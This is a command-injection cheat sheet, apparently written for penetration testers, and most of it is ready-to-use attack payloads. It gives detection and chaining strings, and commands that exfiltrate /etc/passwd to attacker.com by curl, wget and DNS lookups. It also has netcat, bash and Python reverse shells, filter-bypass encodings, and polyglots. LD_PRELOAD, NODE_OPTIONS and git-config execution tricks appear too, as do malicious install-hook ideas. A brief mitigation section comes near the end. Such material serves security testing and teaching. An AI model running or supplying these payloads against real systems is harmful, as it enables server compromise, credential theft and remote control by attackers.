## Overview

**Command Injection** (also called **shell injection** or **OS command injection**) is a vulnerability where an attacker can execute arbitrary operating system commands on the server hosting an application. This happens when user-controllable data is processed by a shell command interpreter without proper sanitization.

**Impact:** Full system compromise, data exfiltration, unauthorized access, lateral movement, denial of service.

**Root Cause:** Unsafe concatenation of user input into shell commands, especially when using functions that invoke a shell interpreter.

---

## Detection & Exploitation Methods

### 🎯 Basic Detection Payloads

Try these to detect command injection:

```bash
# Both Unix and Windows
;whoami
|whoami
||whoami
&&whoami
&whoami
%0Awhoami
`whoami`
$(whoami)

# Time-based detection (blind)
& ping -c 10 127.0.0.1 &
;sleep 5;
||ping -c 10 127.0.0.1||
```

### 🔍 Where to Look — Vulnerable Parameters

Top parameter names to test:

```
cmd, exec, command, execute, ping, query, jump, code, reg
do, func, arg, option, load, process, step, read, function
req, feature, exe, module, payload, run, print
```

### 💉 Context-Based Injection

**Depends on where your input lands:**

1. **Inside single quotes:** Break out with `'` first
    
    ```bash
    ' ; whoami ; '
    ' | whoami #
    ```
    
2. **Inside double quotes:** Break out with `"`
    
    ```bash
    " ; whoami ; "
    " | whoami #
    ```
    
3. **Direct concatenation (no quotes):**
    
    ```bash
    ; whoami
    | whoami
    ```
    

---

## Exploitation Techniques

### ⚡ Command Chaining Operators

```bash
# Execute both commands (semicolon)
ls ; id

# Execute both (newline)
ls %0A id
ls%0abash%09-c%09"id"%0a

# Execute both (pipe — 2nd cmd gets 1st cmd's output)
ls | id

# Execute 2nd only if 1st succeeds (AND)
ls && id

# Execute 2nd only if 1st fails (OR)
ls || id

# Execute both in background (ampersand)
ls & id

# Command substitution (backticks)
`whoami`

# Command substitution (dollar parentheses)
$(whoami)

# Brace expansion
{cat,/etc/passwd}
```

### 📂 File Exfiltration

```bash
# Read files
cat /etc/passwd
cat /etc/shadow

# Redirect output to accessible location
& whoami > /var/www/html/output.txt &

# POST file contents via curl
curl --data @/etc/passwd https://attacker.com
curl -F 'file=@/etc/passwd' https://attacker.com

# wget POST exfil
wget --post-file=/etc/passwd https://attacker.com
```

### ⏱️ Time-Based Blind Exfiltration

Extract data character-by-character when no output is visible:

```bash
# Check if first char of whoami is 'r'
time if [ $(whoami|cut -c 1) == r ]; then sleep 5; fi

# Automate extraction
for i in {1..10}; do
  time if [ $(whoami|cut -c $i) == s ]; then sleep 5; fi
done
```

### 🌐 DNS-Based Data Exfiltration

Use DNS queries to leak data (works even with outbound firewall):

```bash
# Basic DNS exfil
nslookup $(whoami).attacker.com

# Exfil file contents
for i in $(cat /etc/passwd); do 
  host "$i.attacker.com"
done

# One-liner with sed
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').attacker.com)
```

**Free DNS exfil services:**

- `dnsbin.zhack.ca`
- `pingb.in`
- Burp Collaborator

### 🔓 Reverse Shells

```bash
# Netcat
nc -e /bin/bash attacker-ip 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker-ip 4444 >/tmp/f

# Bash
bash -i >& /dev/tcp/attacker-ip/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## Filter Bypasses

### 🚫 Bypass Space Restrictions

**Linux:**

```bash
# Using ${IFS}
cat${IFS}/etc/passwd
echo${IFS}"test"

# Using brace expansion
{cat,/etc/passwd}

# Using redirection
cat</etc/passwd

# Using $IFS with custom delimiter
IFS=,;`cat<<<uname,-a`

# Using tab (hex)
cat%09/etc/passwd

# Using newline
cat%0a/etc/passwd
```

**Windows:**

```bash
ping%CommonProgramFiles:~10,-18%192.168.1.1
ping%PROGRAMFILES:~10,-5%192.168.1.1
```

### 🔤 Bypass Character Filters

**Using quotes:**

```bash
w'h'o'am'i
w"h"o"am"i
```

**Using backslashes:**

```bash
w\ho\am\i
/\b\i\n/////s\h
```

**Using $@ variable:**

```bash
who$@ami
cat$@/etc$@/passwd
```

**Using wildcards:**

```bash
cat /etc/pa??wd
cat /etc/pa*wd
/???/??t /???/p??s??
```

**Using variable expansion:**

```bash
# Extract slash from $HOME
echo ${HOME:0:1}
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Using tr to generate slash
echo . | tr '!-0' '"-1'
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd

# String replacement
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
```

### 🔢 Bypass Using Encoding

**Hex encoding:**

```bash
# Linux
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# Using xxd
xxd -r -p <<< 2f6574632f706173737764
cat $(xxd -r -p <<< 2f6574632f706173737764)

# ANSI-C quoting
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
cat $abc
```

**Octal encoding:**

```bash
echo -e "\0164\0145\0163\0164"
```

### 🧩 Polyglot Payloads

Work in multiple contexts (quoted/unquoted):

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

---

## Top 10 Modern Payloads

```bash
# 1. Newline injection (most reliable)
param=value%0Awhoami

# 2. Semicolon chaining
param=value;whoami

# 3. Pipe chaining
param=value|whoami

# 4. Background execution
param=value&whoami&

# 5. AND operator
param=value&&whoami

# 6. OR operator (executes if first fails)
param=value||whoami||

# 7. Command substitution
param=value$(whoami)

# 8. Backtick substitution
param=value`whoami`

# 9. Brace expansion (no spaces)
param={cat,/etc/passwd}

# 10. IFS bypass (no spaces)
param=cat${IFS}/etc/passwd
```

---

## Environment Variable Injection

### 🔥 BASH_ENV

Execute commands via `BASH_ENV`:

```bash
BASH_ENV='$(id 1>&2)' bash -c 'echo hello'
```

### 🔥 LD_PRELOAD

Load malicious shared library:

```c
// inject.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void init() {
    system("id > /tmp/pwned");
}
```

Compile and inject:

```bash
gcc -shared -fPIC inject.c -o inject.so
LD_PRELOAD=./inject.so /bin/ls
```

### 🔥 NODE_OPTIONS

Execute code via Node.js:

```bash
# With file write
echo 'require("child_process").execSync("id").toString()' > /tmp/pwn.js
NODE_OPTIONS='--require /tmp/pwn.js' node

# Without file write (via /proc/self/environ)
AAAA='console.log(require("child_process").execSync("id").toString())//' NODE_OPTIONS='--require /proc/self/environ' node
```

### 🔥 PYTHONWARNINGS

```bash
# With file write
cat > /tmp/pwn.py << EOF
import os
os.system("id")
EOF
PYTHONPATH="/tmp" PYTHONWARNINGS=all:0:pwn.x:0:0 python3

# Using antigravity + perldoc
PYTHONWARNINGS=all:0:antigravity.x:0:0 BROWSER=perldoc PERL5OPT='-Mbase;system("id");' python3
```

### 🔥 Git Config Abuse

```bash
# core.fsmonitor
git -c core.fsmonitor='echo "pwned" >&2; false' status

# core.sshCommand
git clone -c core.sshCommand='id >&2 #' ssh://github.com/user/repo

# core.pager
git -c core.pager='id #' grep --open-files-in-pager .
```

---

## Language-Specific Sinks

### Node.js — Dangerous Functions

```javascript
// ❌ VULNERABLE (spawns shell)
exec('cmdname ' + userInput)

// ✅ SAFE (no shell, array args)
execFile('cmdname', [arg1, arg2])
```

**Vulnerable patterns:**

```javascript
child_process.exec(cmd)
child_process.execSync(cmd)
child_process.spawn(cmd, {shell: true})
```

### Python — Dangerous Functions

```python
# ❌ VULNERABLE
os.system(cmd)
os.popen(cmd)
subprocess.call(cmd, shell=True)
subprocess.run(cmd, shell=True)

# ✅ SAFER (list args, no shell)
subprocess.run(['cmd', arg1, arg2])
```

### Ruby — Dangerous Functions

```ruby
# ❌ VULNERABLE
`whoami`
%x(whoami)
system("cmd #{user_input}")
exec("cmd #{user_input}")

# ✅ SAFER
system("cmd", arg1, arg2)
```

### Java — Dangerous Functions

```java
// ❌ VULNERABLE
Runtime.getRuntime().exec("cmd " + userInput)

// ✅ SAFER
new ProcessBuilder("cmd", arg1, arg2).start()
```

---

## Argument Injection (No Shell Metacharacters)

Even without shell metacharacters, you can abuse programs via leading hyphens:

### Example: curl

```bash
# Write to arbitrary file
curl https://evil.com/shell.php -o /var/www/html/shell.php

# Load config from URL
curl -K https://evil.com/config.txt https://victim.com
```

### Example: wget

```bash
# Exfiltrate files
wget --post-file=/etc/passwd https://attacker.com

# Execute via askpass
wget --use-askpass=./malicious.sh http://example.com
```

### Example: git

```bash
# Execute via upload-pack
git clone --upload-pack='id >&2 #' repo

# Execute via config
git -c core.fsmonitor='id >&2; false' status
```

### Example: find

```bash
# Execute commands
find . -exec id \; -quit

# Write to file
find . -fprintf /tmp/out 'payload' -quit
```

---

## Higher Impact Techniques

### 🎯 Pivot to RCE in Special Contexts

**npm/bundler/pip install:**

- Inject malicious packages with install hooks
- Use `prepare`, `preinstall`, `postinstall` scripts (npm)
- Use `.gemspec` with arbitrary code (Ruby)
- Use `setup.py` with cmdclass (Python)

**Git hooks:**

- Inject malicious `.git/hooks/post-checkout`
- Abuse `core.fsmonitor` config

**Terraform:**

- Inject malicious provider with `terraform init`

### 🌐 SSRF via Proxies

```bash
# Git HTTP proxy
git clone -c http.proxy=http://attacker.com repo

# wget via proxy
http_proxy=http://attacker.com wget https://internal-service
```

---

## Mitigation

✅ **Best Practices:**

1. **Avoid shell execution** — Use direct syscalls/APIs
    
    - Node: `execFile()` with array args
    - Python: `subprocess.run([...])` without `shell=True`
    - Java: `ProcessBuilder` with array args
2. **Input validation:**
    
    - Allowlist approach (not blacklist)
    - Reject special characters: `; | & $` ( ) < > \n`
    - Use parameterized APIs
3. **Least privilege:**
    
    - Run applications as low-privilege user
    - Use containers/sandboxing
4. **Environment isolation:**
    
    - Disable dangerous env vars (`LD_PRELOAD`, `NODE_OPTIONS`)

---

## Tools

- **Commix** — Automated command injection tool  
    `https://github.com/commixproject/commix`
    
- **Burp Command Injection Attacker**  
    `https://portswigger.net/bappstore/33e4402eee514724b768c0342abadb8a`
    

---

## Quick Reference Commands

**Linux:**

```bash
whoami
id
uname -a
cat /etc/passwd
ls -la /
ps aux
netstat -an
ifconfig
```

**Windows:**

```bash
whoami
ver
ipconfig /all
dir
tasklist
netstat -an
```
